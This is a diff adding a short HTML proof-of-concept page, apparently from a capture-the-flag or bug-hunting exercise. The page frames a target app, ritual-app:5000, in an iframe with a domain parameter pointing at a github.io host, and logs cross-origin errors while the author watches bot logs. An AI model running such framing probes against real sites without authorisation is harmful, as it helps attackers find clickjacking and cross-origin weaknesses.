@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>POC Frame Test</title>
+  <style> body { margin:0; background:#111; color:#f44; font-family:monospace; } iframe { width:100vw; height:100vh; border:none; } </style>
+</head>
+<body>
+  <h2>Testing framing http://ritual-app:5000/ — watch bot logs</h2>
+  <iframe id="target" src="http://ritual-app:5000/?domain=sfymantissa.github.io"></iframe>
+
+  <script>
+    const ifr = document.getElementById('target');
+    ifr.onload = () => {
+      console.log('[POC] Iframe loaded — framing probably allowed');
+      try {
+        // Try things that may throw interesting errors
+        const loc = ifr.contentWindow.location.href;
+        console.log('[POC] location:', loc);
+      } catch (e) {
+        console.error('[POC] Cross-origin error:', e.name, e.message);
+        console.error('[POC] Full error string:', e.toString());
+      }
+    };
+    ifr.onerror = () => console.error('[POC] Iframe failed to load');
+  </script>
+</body>
+</html>
